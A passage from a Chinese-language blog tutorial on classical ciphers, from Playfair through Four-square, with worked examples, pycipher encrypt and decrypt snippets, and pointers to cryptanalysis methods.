MO RX RX OW</code> 。</p><h4 id="3-编写密文"><a href="#3-编写密文" class="headerlink" title="(3)编写密文"></a>(3)编写密文</h4><p>我们要得到的密文，当然，对于每个字母对，要严格遵循如下的原则：</p><p>1.如果两个字母在同一行则要用它右邻的字母替换，如果已在最右边，则用该行最左边的替换，如明文为” <code>CE</code> “，依据上表，应替换为” <code>EG</code> “；</p><p>2.如果两个字母在同一列则要用它下边的字母替换，如果已在最下边，则用该行最上边的替换，如明文为” <code>OQ</code> “，依据上表，应替换为” <code>PS</code> “；</p><p>3.如果两个字母在不同的行或列，则应在密码表中找两个字母使四个字母组成一个矩形，明文占据两个顶点，需用另外两个顶点的字母替换，如明文为” <code>HX</code> “，可以替换为” <code>WI/J</code> “或” <code>I/JW</code> “（下面的例子将按照横向替换原则即同行优先）。</p><p>按照上述原则，将明文 <code>TH EQ UI CK BR OW NF OX JU MP SO VE RT HE LA ZY DO GX</code> 加以转换得到 <code>KU ND LH GT LF WU ES PW LH SI/J NP CG CR AG BU VZ QA I/JV</code> （/表示或者，不过一般用I不用J，所以分析密文时你看25个字母都有而只差一个字母没有用到可以考虑一下这种加密方式）将得到的字母改为大写并五个一组列好，得到密文 <code>KUNDL HGTLF WUESP WLHSI NPCGC RAGBU VZQAI V</code> 。</p><p>加密解密 <a href="http://www.practicalcryptography.com/ciphers/classical-era/playfair/" target="_blank" rel="noopener">传送门</a> (ps：这里加解密是横向编制密码表)</p><p>加密解密实例(ps：这里加解密也是横向编制密码表)：</p><pre><code>#!python&gt;&gt;&gt;from pycipher import Playfair&gt;&gt;&gt;Playfair(&#39;CULTREABDFGHIKMNOPQSVWXYZ&#39;).encipher(&#39;THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG&#39;)&#39;UKDNLHTGFLWUSEPWHLISNPCGCRGAUBVZAQIV&#39;&gt;&gt;&gt;Playfair(&#39;CULTREABDFGHIKMNOPQSVWXYZ&#39;).decipher(&#39;UKDNLHTGFLWUSEPWHLISNPCGCRGAUBVZAQIV&#39;)&#39;THEQUICKBROWNFOXIUMPSOVERTHELAZYDOGX&#39;</code></pre><h3 id="10-维吉尼亚密码"><a href="#10-维吉尼亚密码" class="headerlink" title="10.维吉尼亚密码"></a>10.维吉尼亚密码</h3><h4 id="（1）介绍-10"><a href="#（1）介绍-10" class="headerlink" title="（1）介绍"></a>（1）介绍</h4><p>维吉尼亚密码(Vigenère Cipher)是在单一恺撒密码的基础上扩展出多表代换密码，根据密钥(当密钥长度小于明文长度时可以循环使用)来决定用哪一行的密表来进行替换，以此来对抗字频统计，更多 <a href="https://en.wikipedia.org/wiki/Vigenère_cipher" target="_blank" rel="noopener">参考</a> 。</p><p>密表：</p><p><img src="http://cdn.sijiu.ren/blog/20200426/rVLv0SeUmBDK.png?imageslim" alt="mark"></p><p>明文： <code>THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG</code></p><p>密钥(循环使用，密钥越长相对破解难度越大)： <code>CULTURE</code></p><p>加密过程：如果第一行为明文字母，第一列为密钥字母，那么明文字母’T’列和密钥字母’C’行的交点就是密文字母’V’，以此类推。</p><p>密文： <code>VBP JOZGM VCHQE JQR UNGGW QPPK NYI NUKR XFK</code></p><h4 id="（2）已知密钥加解密"><a href="#（2）已知密钥加解密" class="headerlink" title="（2）已知密钥加解密"></a>（2）已知密钥加解密</h4><pre><code>#!python&gt;&gt;&gt;from pycipher import Vigenere&gt;&gt;&gt;Vigenere(&#39;CULTURE&#39;).encipher(&#39;THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG&#39;)&#39;VBPJOZGMVCHQEJQRUNGGWQPPKNYINUKRXFK&#39;&gt;&gt;&gt;Vigenere(&#39;CULTURE&#39;).decipher(&#39;VBPJOZGMVCHQEJQRUNGGWQPPKNYINUKRXFK&#39;)&#39;THEQUICKBROWNFOXJUMPSOVERTHELAZYDOG&#39;</code></pre><p>在线加密解密 <a href="http://planetcalc.com/2468/" target="_blank" rel="noopener">传送门</a></p><h4 id="（3）未知密钥破解"><a href="#（3）未知密钥破解" class="headerlink" title="（3）未知密钥破解"></a>（3）未知密钥破解</h4><p>可以参考 <a href="http://www.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-vigenere-cipher/" target="_blank" rel="noopener">维吉尼亚密码分析</a> 这篇文章，破解维吉尼亚密码第一步是确定密钥长度，维吉尼亚密码分析这篇文章里介绍了使用 <a href="https://en.wikipedia.org/wiki/Index_of_coincidence" target="_blank" rel="noopener">重合指数</a> 算法来确定密钥长度，在确定密钥长度后就可以尝试确定密钥，通常我们可以使用 <a href="https://en.wikipedia.org/wiki/Chi-squared_test" target="_blank" rel="noopener">卡方检验</a> 来找到每个字母的偏移量，基于维吉尼亚密码分析一文中的算法实现的工具破解示例。</p><p>密文： <code>kiqpbkxspshwehospzqhoinlgapp</code></p><p>解密：</p><p><img src="http://cdn.sijiu.ren/blog/20200426/ayz3E9zraNB3.png?imageslim" alt="mark"></p><p>(ps:结合左边的值，密钥以及解出明文可以确定kien 5或者klen 10为准确的结果)</p><p>明文： <code>DEFEND THE EAST WALL OF THE CASTLE</code></p><h4 id="（4）变种"><a href="#（4）变种" class="headerlink" title="（4）变种"></a>（4）变种</h4><p>有几种密码和维吉尼亚密码相似，格罗斯费尔德密码(Gronsfeld cipher)实际上和维吉尼亚密码相同，除了使用了数字来代替字母以外没有什么区别。数字可以选择一种数列，如斐波那契数列，或者一些其他的伪随机序列。格罗斯费尔德密码密码分析过程和维吉尼亚密码大同小异，不过，自动密钥密码不能使用 <a href="http://www.zybang.com/question/a0a1108423f63d10dbbf0c3e1bfdf3b3.html" target="_blank" rel="noopener">卡西斯基算法</a> (kasiski)来破译，因为自动密钥密码的密钥不重复循环使用，破译自动密钥密码最好的方法的就是从密文不断尝试和猜测其中明文或密钥的一部分。</p><p><img src="http://cdn.sijiu.ren/blog/20200426/BD18bv9AFo6t.png?imageslim" alt="mark"></p><pre><code>#!python&gt;&gt;&gt;from pycipher import Gronsfeld&gt;&gt;&gt;Gronsfeld([2,20,11,45,20,43,4]).encipher(&#39;THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG&#39;)&#39;VBPJOZGMVCHQEJQRUNGGWQPPKNYINUKRXFK&#39;&gt;&gt;&gt;Gronsfeld([2,20,11,45,20,43,4]).decipher(&#39;VBPJOZGMVCHQEJQRUNGGWQPPKNYINUKRXFK&#39;)&#39;THEQUICKBROWNFOXJUMPSOVERTHELAZYDOG&#39;</code></pre><p>在线加解密 <a href="http://rumkin.com/tools/cipher/gronsfeld.php" target="_blank" rel="noopener">传送门</a></p><h3 id="11-自动密钥密码"><a href="#11-自动密钥密码" class="headerlink" title="11.自动密钥密码"></a>11.自动密钥密码</h3><h4 id="（1）介绍-11"><a href="#（1）介绍-11" class="headerlink" title="（1）介绍"></a>（1）介绍</h4><p>自动密钥密码(Autokey Cipher)是多表替换密码，与维吉尼亚密码密切相关，但使用不同的方法生成密钥，通常来说要比维吉尼亚密码更安全。自动密钥密码主要有两种，关键词自动密钥密码和原文自动密钥密码.下面我们以关键词自动密钥为例：</p><p>明文： <code>THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG</code></p><p>关键词： <code>CULTURE</code></p><p>自动生成密钥： <code>CULTURE THE QUICK BROWN FOX JUMPS OVER THE</code></p><p>接下来的加密过程和维吉尼亚密码类似，从密表可得：</p><p>密文： <code>VBP JOZGD IVEQV HYY AIICX CSNL FWW ZVDP WVK</code></p><h4 id="（2）已知关键词加解密"><a href="#（2）已知关键词加解密" class="headerlink" title="（2）已知关键词加解密"></a>（2）已知关键词加解密</h4><pre><code>#!python&gt;&gt;&gt;from pycipher import Autokey&gt;&gt;&gt;Autokey(&#39;CULTURE&#39;).encipher(&#39;THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG&#39;)&#39;VBPJOZGDIVEQVHYYAIICXCSNLFWWZVDPWVK&#39;&gt;&gt;&gt;Autokey(&#39;CULTURE&#39;).decipher(&#39;VBPJOZGDIVEQVHYYAIICXCSNLFWWZVDPWVK&#39;)&#39;THEQUICKBROWNFOXJUMPSOVERTHELAZYDOG&#39;</code></pre><p>在线加解密 <a href="http://www.practicalcryptography.com/ciphers/classical-era/autokey/" target="_blank" rel="noopener">传送门</a></p><h4 id="（3）未知关键词破解"><a href="#（3）未知关键词破解" class="headerlink" title="（3）未知关键词破解"></a>（3）未知关键词破解</h4><p>推荐去看这篇 <a href="http://www.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-autokey-cipher/" target="_blank" rel="noopener">自动密钥密码分析文章</a> ，基于文中的算法实现的工具来破解示例。</p><p>密文:</p><pre><code>#!shellisjiqymdebvuzrvwhmvysibugzhyinmiyeiklcvioimbninyksmmnjmgalvimlhspjxmgfiraqlhjcpvolqmnyynhpdetoxemgnoxl</code></pre><p>解密</p><p><img src="http://cdn.sijiu.ren/blog/20200426/JoUu5lngaSnq.png?imageslim" alt="mark"></p><p>(ps:从klen 13可以看出使用的关键词为’FORTIFICATION’)</p><p>明文：</p><pre><code>#!shellDESPITEBEINGMORESECURETHANTHEVIGENERECIPHERTHEAUTOKEYCIPHERISSTILLVERYEASYTOBREAKUSINGAUTOMATEDMETHODS</code></pre><p>将明文转换成可读句子：</p><p>despite being more secure than the vigenere cipher the autokey cipher is still very easy to break using automated methods</p><h3 id="12-博福特密码"><a href="#12-博福特密码" class="headerlink" title="12.博福特密码"></a>12.博福特密码</h3><h4 id="（1）介绍-12"><a href="#（1）介绍-12" class="headerlink" title="（1）介绍"></a>（1）介绍</h4><p>博福特密码(Beaufort Cipher)，是一种类似于维吉尼亚密码的代换密码，由弗朗西斯·蒲福(Francis Beaufort)发明。它最知名的应用是Hagelin M-209密码机。博福特密码属于对等加密，即加密演算法与解密演算法相同。</p><p>明文： <code>THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG</code></p><p>密钥(循环使用，密钥越长相对破解难度越大)： <code>CULTURE</code></p><p>加密过程：如果第一行为明文字母，第一列为密文字母，那么沿明文字母’T’列出现密钥字母’C’的行号就是密文字母’J’，以此类推。</p><p>密文： <code>JNH DAJCS TUFYE ZOX CZICM OZHC BKA RUMV RDY</code></p><h4 id="（2）已知密钥加解密-1"><a href="#（2）已知密钥加解密-1" class="headerlink" title="（2）已知密钥加解密"></a>（2）已知密钥加解密</h4><pre><code>#!python&gt;&gt;&gt;from pycipher import Beaufort&gt;&gt;&gt;Beaufort(&#39;CULTURE&#39;).encipher(&#39;THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG&#39;)&#39;JNHDAJCSTUFYEZOXCZICMOZHCBKARUMVRDY&#39;&gt;&gt;&gt;Beaufort(&#39;CULTURE&#39;).decipher(&#39;JNHDAJCSTUFYEZOXCZICMOZHCBKARUMVRDY&#39;)&#39;THEQUICKBROWNFOXJUMPSOVERTHELAZYDOG&#39;</code></pre><p>在线加解密 <a href="http://www.practicalcryptography.com/ciphers/classical-era/beaufort/" target="_blank" rel="noopener">传送门</a></p><h3 id="13-滚动密钥密码"><a href="#13-滚动密钥密码" class="headerlink" title="13.滚动密钥密码"></a>13.滚动密钥密码</h3><h4 id="（1）介绍-13"><a href="#（1）介绍-13" class="headerlink" title="（1）介绍"></a>（1）介绍</h4><p>滚动密钥密码(Running Key Cipher)和维吉尼亚密码有着相同的加密机制，区别是密钥的选取，维吉尼亚使用的密钥简短，而且重复循环使用，与之相反，滚动密钥密码使用很长的密钥，比如引用一本书作为密钥。这样做的目的是不重复循环使用密钥，使密文更难破译，尽管如此，滚动密钥密码还是可以被攻破，因为有关于密钥和明文的统计分析模式可供利用，如果滚动密钥密码使用统计上的随机密钥来源，那么理论上是不可破译的，因为任何可能都可以成为密钥，并且所有的可能性都是相等的。</p><p>明文： <code>THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG</code></p><p>密钥：选取C语言编程(1978版)第63页第1行”errors can occur in several places. A label has…”，去掉非字母部分作为密钥(实际选取的密钥很长，长度至少不小于明文长度)。</p><p>加密过程：加密过程和维吉尼亚密码加密过程相同</p><p>密文: <code>XYV ELAEK OFQYH WWK BYHTJ OGTC TJI DAK YESR</code></p><p>已知密钥在线加解密 <a href="http://www.practicalcryptography.com/ciphers/classical-era/running-key/" target="_blank" rel="noopener">传送门</a></p><h3 id="14-Porta密码"><a href="#14-Porta密码" class="headerlink" title="14.Porta密码"></a>14.Porta密码</h3><h4 id="（1）介绍-14"><a href="#（1）介绍-14" class="headerlink" title="（1）介绍"></a>（1）介绍</h4><p>Porta密码(Porta Cipher)是一个由意大利那不勒斯的医生Giovanni Battista della Porta发明的多表代换密码，Porta密码具有加密解密过程的是相同的特点。</p><p>密表：</p><pre><code>#!shellKEYS| A B C D E F G H I J K L M N O P Q R S T U V W X Y Z----|----------------------------------------------------A,B | N O P Q R S T U V W X Y Z A B C D E F G H I J K L MC,D | O P Q R S T U V W X Y Z N M A B C D E F G H I J K LE,F | P Q R S T U V W X Y Z N O L M A B C D E F G H I J KG,H | Q R S T U V W X Y Z N O P K L M A B C D E F G H I JI,J | R S T U V W X Y Z N O P Q J K L M A B C D E F G H IK,L | S T U V W X Y Z N O P Q R I J K L M A B C D E F G HM,N | T U V W X Y Z N O P Q R S H I J K L M A B C D E F GO,P | U V W X Y Z N O P Q R S T G H I J K L M A B C D E FQ,R | V W X Y Z N O P Q R S T U F G H I J K L M A B C D ES,T | W X Y Z N O P Q R S T U V E F G H I J K L M A B C DU,V | X Y Z N O P Q R S T U V W D E F G H I J K L M A B CW,X | Y Z N O P Q R S T U V W X C D E F G H I J K L M A BY,Z | Z N O P Q R S T U V W X Y B C D E F G H I J K L M A</code></pre><p>明文： <code>THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG</code></p><p>密钥(循环使用，密钥越长相对破解难度越大)： <code>CULTURE</code></p><p>加密过程：明文字母’T’列与密钥字母’C’行交点就是密文字母’F’,以此类推。</p><p>密文： <code>FRW HKQRY YMFMF UAA OLWHD ALWI JPT ZXHC NGV</code></p><p>已知密钥在线加解密 <a href="http://www.practicalcryptography.com/ciphers/classical-era/porta/" target="_blank" rel="noopener">传送门</a></p><h4 id="（2）破解-1"><a href="#（2）破解-1" class="headerlink" title="（2）破解"></a>（2）破解</h4><p>Porta密码可以被以 <a href="http://www.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-vigenere-cipher-part-2/" target="_blank" rel="noopener">维吉尼亚密码</a> 破解相类似方式进行自动攻破，破解Porta密码第一步是先确定密钥长度，这里推荐一篇关于使用 <a href="https://en.wikipedia.org/wiki/Index_of_coincidence" target="_blank" rel="noopener">重合指数算法</a> 确定为维吉尼亚密钥长度 <a href="http://www.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-vigenere-cipher/" target="_blank" rel="noopener">文章</a> 。</p><h3 id="15-同音替换密码"><a href="#15-同音替换密码" class="headerlink" title="15.同音替换密码"></a>15.同音替换密码</h3><h4 id="（1）介绍-15"><a href="#（1）介绍-15" class="headerlink" title="（1）介绍"></a>（1）介绍</h4><p>同音替换密码(Homophonic Substitution Cipher)是单字母可以被其他几种密文字母同时替换的密码，通常要比标准替换密码破解更加困难，破解标准替换密码最简单的方法就是分析字母出现频率，通常在英语中字母’E’(或’T’)出现的频率是最高的，如果我们允许字母’E’可以同时被3种不同字符代替，那么就不能还是以普通字母的频率来分析破解，如果允许可代替字符越多，那么密文就会更难破译。</p><p>常见代换规则表：</p><p><img src="http://cdn.sijiu.ren/blog/20200426/6buc5usAJEke.png?imageslim" alt="mark"></p><p>明文: <code>THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG</code></p><p>密文(其中一种)： <code>6CZ KOVST XJ0MA EQY IOGL4 0W1J UC7 P9NB F0H</code></p><h4 id="（2）破解-2"><a href="#（2）破解-2" class="headerlink" title="（2）破解"></a>（2）破解</h4><p>如果同音替换密码的同音词个数很多，那么破解它难度很大，通常的方法采取类似破解替换密码的”爬山算法”，除了找到一个明文字母映射几个字符之外，我们还需要确定映射了那些字符，可以尝试 <a href="http://www.cs.sjsu.edu/faculty/stamp/RUA/homophonic.pdf" target="_blank" rel="noopener">2层嵌套”爬山算法”</a> 来破解，外层确定映射的数量，内层确定映射字符。</p><h3 id="16-仿射密码"><a href="#16-仿射密码" class="headerlink" title="16.仿射密码"></a>16.仿射密码</h3><h4 id="（1）介绍-16"><a href="#（1）介绍-16" class="headerlink" title="（1）介绍"></a>（1）介绍</h4><p>仿射密码(Affine Cipher)是一种单表代换密码，字母表中的每个字母相应的值使用一个简单的数学函数映射到对应的数值，再把对应数值转换成字母。这个公式意味着每个字母加密都会返回一个相同的字母，意义着这种加密方式本质上是一种标准替代密码。因此，它具有所有替代密码的弱点。每一个字母都是通过函数（ax + b）mod m加密，其中B是位移量，为了保证仿射密码的可逆性，a和m需要满足gcd(a , m)=1，一般m为设置为26。更多 <a href="https://en.wikipedia.org/wiki/Affine_cipher" target="_blank" rel="noopener">参考</a></p><p>常见的字母对应关系：</p><p><img src="http://cdn.sijiu.ren/blog/20200426/vBDvkHLuGu5n.png?imageslim" alt="mark"></p><p>下面我们以E(x) = (5x + 8) mod 26函数为例子</p><p><img src="http://cdn.sijiu.ren/blog/20200426/pRNzVz8Syehu.png?imageslim" alt="mark"></p><p>至于解密我们知道</p><p><img src="http://cdn.sijiu.ren/blog/20200426/s5Dah7Ai2zUh.png?imageslim" alt="mark"></p><p><img src="http://cdn.sijiu.ren/blog/20200426/Xc1qmkJBVT8O.png?imageslim" alt="mark"></p><p>即可得出解密结果</p><p><img src="http://cdn.sijiu.ren/blog/20200426/SrYGDr21IhbP.png?imageslim" alt="mark"></p><p>以E(x) = (5x + 8) mod 26加密，通过计算可得D(x)=21(x - 8) mod 26，这样便可以得到明文。</p><p>可参考的Python脚本</p><p><img src="http://cdn.sijiu.ren/blog/20200426/o5EAqu8r45dF.png?imageslim" alt="mark"></p><p>加解密 <a href="http://www.practicalcryptography.com/ciphers/classical-era/affine/" target="_blank" rel="noopener">传送门</a></p><h3 id="17-培根密码"><a href="#17-培根密码" class="headerlink" title="17.培根密码"></a>17.培根密码</h3><h4 id="（1）介绍-17"><a href="#（1）介绍-17" class="headerlink" title="（1）介绍"></a>（1）介绍</h4><p>培根密码(Baconian Cipher)是一种替换密码，每个明文字母被一个由5字符组成的序列替换，最初的加密方式就是由’A’和’B’组成序列替换明文(所以你当然也可以用别的字母)，比如字母’D’替换成”aaabb”，以下是全部的对应关系(另一种对于关系是每个字母都有唯一对应序列，I和J与U/V各自都有不同对应序列)：</p><pre><code>#!shellA = aaaaa  I/J = abaaa  R = baaaaB = aaaab  K = abaab    S = baaabC = aaaba  L = ababa    T = baabaD = aaabb  M = ababb    U/V = baabbE = aabaa  N = abbaa    W = babaaF = aabab  O = abbab    X = bababG = aabba  P = abbba    Y = babbaH = aabbb  Q = abbbb    Z = babbb</code></pre><p>明文： <code>T H E F O X</code></p><p>密文： <code>baaba aabbb aabaa aabab abbab babab</code></p><p>加解密 <a href="http://rumkin.com/tools/cipher/baconian.php" target="_blank" rel="noopener">传送门</a></p><h3 id="18-ADFGX和ADFGVX密码"><a href="#18-ADFGX和ADFGVX密码" class="headerlink" title="18.ADFGX和ADFGVX密码"></a>18.ADFGX和ADFGVX密码</h3><h4 id="（1）ADFGX密码"><a href="#（1）ADFGX密码" class="headerlink" title="（1）ADFGX密码"></a>（1）ADFGX密码</h4><p>ADFGX密码(ADFGX Cipher)是结合了改良过的Polybius方格替代密码与单行换位密码的矩阵加密密码，使用了5个合理的密文字母：A，D，F，G，X，这些字母之所以这样选择是因为当转译成摩尔斯电码(ADFGX密码是德国军队在一战发明使用的密码)不易混淆，目的是尽可能减少转译过程的操作错误。</p><p>加密矩阵示例：</p><pre><code>#!shell    A  D  F  G   X  ----------------A | p  h  q  g   m D | e  a  y  n   o F | f  d  x  k   rG | c  v  s  z   w X | b  u  t  i/j l</code></pre><p>明文： <code>THE QUICK BROWN FOX</code></p><p>结果矩阵加密：</p><pre><code>#!shellXF AD DA   AF XD XG GA FG   XA FX DX GX DG   FA DX FF</code></pre><p>列移位密钥： <code>how are u</code></p><p><img src="http://cdn.sijiu.ren/blog/20200426/ptQhpra6BJUJ.png?imageslim" alt="mark"></p><p>密文： <code>DXADF AGXF XFFXD FXGGX DGFG AADA ADXXF</code></p><p>已知密钥加解密：</p><pre><code>#!python&gt;&gt;&gt;from pycipher import ADFGX&gt;&gt;&gt;a = ADFGX(&#39;phqgmeaynofdxkrcvszwbutil&#39;,&#39;HOWAREU&#39;)&gt;&gt;&gt;a.encipher(&#39;THE QUICK BROWN FOX&#39;)&#39;DXADFAGXFXFFXDFXGGXDGFGAADAADXXF&#39;&gt;&gt;&gt;a.decipher(&#39;DXADFAGXFXFFXDFXGGXDGFGAADAADXXF&#39;)&#39;THEQUICKBROWNFOX&#39;</code></pre><p>在线加解密 <a href="http://www.practicalcryptography.com/ciphers/adfgx-cipher/" target="_blank" rel="noopener">传送门</a></p><h4 id="（2）ADFGVX密码"><a href="#（2）ADFGVX密码" class="headerlink" title="（2）ADFGVX密码"></a>（2）ADFGVX密码</h4><p>ADFGVX密码实际上就是ADFGX密码的扩充升级版，一样具有ADFGX密码相同的特点，加密过程也类似，不同的是密文字母增加了V，使得可以再使用10数字来替换明文。</p><pre><code>#!shell    A D F G V X  -------------A | p h 0 q g 6D | 4 m e a 1 yF | l 2 n o f dG | x k r 3 c vV | s 5 z w 7 bX | j 9 u t i 8</code></pre><p>由于两种加密过程完全类似这里就不再重复给出加密过程。</p><pre><code>#!python&gt;&gt;&gt;from pycipher import ADFGVX&gt;&gt;&gt;a = ADFGVX(&#39;ph0qg64mea1yl2nofdxkr3cvs5zw7bj9uti8&#39;,&#39;HOWAREU&#39;)&gt;&gt;&gt;a.encipher(&#39;THE QUICK BROWN FOX&#39;)&#39;DXXFAFGFFXGGGFGXDVGDVGFAVFVAFVGG&#39;&gt;&gt;&gt;a.decipher(&#39;DXXFAFGFFXGGGFGXDVGDVGFAVFVAFVGG&#39;)&#39;THEQUICKBROWNFOX&#39;</code></pre><h3 id="19-双密码"><a href="#19-双密码" class="headerlink" title="19.双密码"></a>19.双密码</h3><h4 id="（1）双密码"><a href="#（1）双密码" class="headerlink" title="（1）双密码"></a>（1）双密码</h4><p>双密码(Bifid Cipher)结合了波利比奥斯方阵换位密码，并采用分级实现扩散，这里的“双”是指用2个密钥进行加密。双密码是由法国Felix Delastelle发明，除此之外Felix Delastelle还发明了三分密码(Trifid Cipher)，四方密码(Four-Square Cipher)。还有一个 <a href="https://en.wikipedia.org/wiki/Two-square_cipher" target="_blank" rel="noopener">两方密码</a> (Two-Square)与四方密码类似， <a href="http://www.thonky.com/kryptos/cm-bifid-cipher" target="_blank" rel="noopener">共轭矩阵双密码</a> (Conjugated Matrix Bifid Cipher)也是双密码的变种。</p><p>示例密阵:</p><pre><code>#!shell   1 2 3 4 51| p h q g m2| e a y l n3| o f d x k4| r c v s z5| w b u t i/j</code></pre><p>明文: <code>THE QUICK BROWN FOX</code></p><p>经过密阵转换：</p><p>行: <code>512 15543 54352 333</code></p><p>列: <code>421 33525 21115 214</code></p><p>分组:</p><p>51215 54354 35233 3</p><p>42133 52521 11521 4</p><p>合并：</p><pre><code>#!shell5121542133 5435452521 3523311521 34</code></pre><p>在经过密阵转换后密文: <code>WETED TKZNE KYOME X</code></p><h4 id="（2）已知密阵加解密"><a href="#（2）已知密阵加解密" class="headerlink" title="（2）已知密阵加解密"></a>（2）已知密阵加解密</h4><pre><code>#!python&gt;&gt;&gt;from pycipher import&gt;&gt;&gt;Bifid(&#39;phqgmeaylnofdxkrcvszwbuti&#39;,5).encipher(&#39;THE QUICK BROWN FOX&#39;)&#39;WETEDTKZNEKYOMEX&#39;&gt;&gt;&gt;Bifid(&#39;phqgmeaylnofdxkrcvszwbuti&#39;,5).decipher(&#39;WETEDTKZNEKYOMEX&#39;)&#39;THEQUICKBROWNFOX&#39;</code></pre><p>在线加解密 <a href="http://www.practicalcryptography.com/ciphers/classical-era/bifid/" target="_blank" rel="noopener">传送门</a></p><h4 id="（3）未知密阵破解"><a href="#（3）未知密阵破解" class="headerlink" title="（3）未知密阵破解"></a>（3）未知密阵破解</h4><p>手工分析破解双密码是有一定难度的，每个字母都是同过3个数字进行非线性代替转换，而且之后还会对字母顺序进行打乱，这样使双密码比一些替换密码和换位密码更难破解。然而，现在是计算机时代，这张加密方式没有安全性可言，通过 <a href="http://baike.baidu.com/link?url=mkceUr0W4L7B7UVQxc-dUkXKPJbj9v4YyBh_hrskt5iXk99UdnjW6mZ_YxoJO1PkT1zdjEZD2hd7TCMiSxpOma" target="_blank" rel="noopener">模拟退火</a> 算法就能快速找到双密码的密阵。 这里推荐一篇详细的 <a href="http://www.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-bifid-cipher/" target="_blank" rel="noopener">双密码破解分析</a> 的文章，基于模拟退火算法实现的工具破解示例：</p><p>密文:</p><pre><code>#!shellKWTAZQLAWWZCPONIVBTTBVQUZUGRNHAYIYGIAAYURCUQLDFTYVHTNQEENUPAIFCUNQTNGITEFUSHFDWHRIFSVTBISYDHHASQSROMUEVPQHHCCRBYTQBHWYRRHTEPEKHOBFSZUQBTSYRSQUDCSAOVUUGXOAUYWHPGAYHDNKEZPFKKWRIEHDWPEIOTBKESYETPBPOGTHQSPUMDOVUEQAUPCPFCQHRPHSOPQRSSLPEVWNIQDIOTSQESDHURIEREN</code></pre><p>解密：</p><p><img src="http://cdn.sijiu.ren/blog/20200426/Yir3iFGin9pF.png?imageslim" alt="mark"></p><p>得到加密矩阵:</p><pre><code>#!shellG B C M KD H U E TL V Y W IX O Z S PN F A R Q</code></pre><p>明文:</p><pre><code>#!shellCRYPTANALYS IS OF BIFID BY HAND IS ACTUALLY FAIRLY DIFFICULT THE FRACTIONATING NATURE OF THE CIPHER IE EACH LETTER IS SUBSTITUTED BY CHARACTERS THEN THESE CHARACTERS ARE IUM BLED WHICH WILL PULL THEM APART MAKES THE CIPHER MUCH STRONGER THAN SUBSTITUTION CIPHERS OR TRANSPOSITION CIPHER SON THEIR OWN</code></pre><h3 id="20-三分密码"><a href="#20-三分密码" class="headerlink" title="20.三分密码"></a>20.三分密码</h3><p>三分密码(Trifid Cipher)结合换位和替换，三分密码与双密码非常相似，差别之处就是用除了3×3×3的密阵代替5×5密阵。</p><p>示例密阵:</p><pre><code>#!shell密阵顺序 = EPSDUCVWYM.ZLKXNBTFGORIJHAQ      方阵 1      方阵 2      方阵 3                                       1 2 3      1 2 3      1 2 3    1 E P S    1 M . Z    1 F G O    2 D U C    2 L K X    2 R I J    3 V W Y    3 N B T    3 H A Q</code></pre><p>明文: <code>THE QUICK BROWN FOX.</code></p><p>经过密阵转换：</p><pre><code>#!shellT H E Q U I C K B R O W N F O X .2 3 1 3 1 3 1 2 2 3 3 1 2 3 3 2 23 3 1 3 2 2 2 2 3 2 1 3 3 1 1 2 13 1 1 3 2 2 3 2 2 1 3 2 1 1 3 3 2</code></pre><p>T(233)表示T在第一个方阵第三行第三列的位置</p><p>分组(分组密钥以5为例):</p><pre><code>#!shellTHEQU ICKBR OWNFO X.23131 31223 31233 2233132 22232 13311 2131132 23221 32113 32</code></pre><p>合并：</p><pre><code>#!shell23131 33132 31132 31223 22232 23221 31233 13311 32113 22 21 32</code></pre><p>在经过密阵转换后密文:</p><pre><code>#!shell231313313231132312232223223221312331331132113222132N  O  O  N  W  G  B  X  X  L  G  H  H  W  S  K  W</code></pre><p>想要深入了解三分密码并破解三分密码的小伙伴推荐去看LANIKI教授的一篇密码课程章节的 <a href="http://www.und.nodak.edu/org/crypto/crypto/lanaki.crypt.class/lessons/lesson17.zip" target="_blank" rel="noopener">讲义</a> 。</p><h3 id="21-四方密码"><a href="#21-四方密码" class="headerlink" title="21.四方密码"></a>21.四方密码</h3><h4 id="（1）介绍-18"><a href="#（1）介绍-18" class="headerlink" title="（1）介绍"></a>（1）介绍</h4><p>四方密码(Four-Square Cipher)是类似普莱菲尔密码双字母加密密码，这样使加密效果强于其他替换密码，因为频率分析变得更加困难了。</p><p>四方密码使用4个预先设置的5×5字母矩阵，每个矩阵包括25个字母，通常字母’j’被融入到’i’中(维基百科上说’q’被忽略，不过这不重要，因为’q’和’j’都是很少出现的字母)，通常左上和右下矩阵式是标准字母排序明文矩阵，右上和左下矩阵是打乱顺序的密钥矩阵。</p><p>示例矩阵：</p><p><img src="http://cdn.sijiu.ren/blog/20200426/wxvEdzh8mPoC.png?imageslim" alt="mark"></p><p>明文： <code>THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG</code></p><p>整理明文(分组不够时用’X’填充)： <code>TH EQ UI CK BR OW NF OX JU MP SO VE RT HE LA ZY DO GX</code></p><p>加密过程：分别在明文矩阵中找到’TH’，分别找到他们在右上矩阵有左下矩阵的交点字母’ES’就是密文，以此类推。</p><p>密文： <code>ESZWQAFHGTDKWHRKUENYQOLMQTUNWMBPTGHQ</code></p><h4 id="（2）已知密钥矩阵加解密"><a href="#（2）已知密钥矩阵加解密" class="headerlink" title="（2）已知密钥矩阵加解密"></a>（2）已知密钥矩阵加解密</h4><pre><code>#!python&gt;&gt;&gt;from pycipher import Foursquare&gt;&gt;&gt;fs = Foursquare(&#39;zgptfoihmuwdrcnykeqaxvsbl&#39;,&#39;mfnbdcrhsaxyogvituewlqzkp&#39;)&gt;&gt;&gt;fs.encipher(&#39;THE QUICK BROWN FOX JUMPS OVER THE LAZY 